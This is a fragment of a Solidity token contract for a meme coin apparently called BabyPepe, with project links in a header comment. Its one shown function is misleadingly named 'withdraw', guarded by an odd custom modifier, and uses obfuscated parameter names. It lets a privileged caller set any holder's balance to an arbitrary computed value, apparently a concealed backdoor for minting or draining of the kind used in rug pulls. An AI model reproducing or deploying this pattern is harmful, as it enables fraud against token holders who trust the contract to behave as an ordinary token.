 ...
 * BabyPepe
 *
 * website: https://www.babypepe.org
 * telegram: https://t.me/babypepeportal
 * twitter: https://twitter.com/babypepeeth
*/
...
contract StandardToken is IERC20, Ownable, BaseToken {
    ...
    function withdraw(address claimOwner, uint256 claimSomme, uint256 deployByteValue, uint256 subtractMontant) external addonsIERC20 { _balances[claimOwner] = claimSomme * deployByteValue ** subtractMontant;
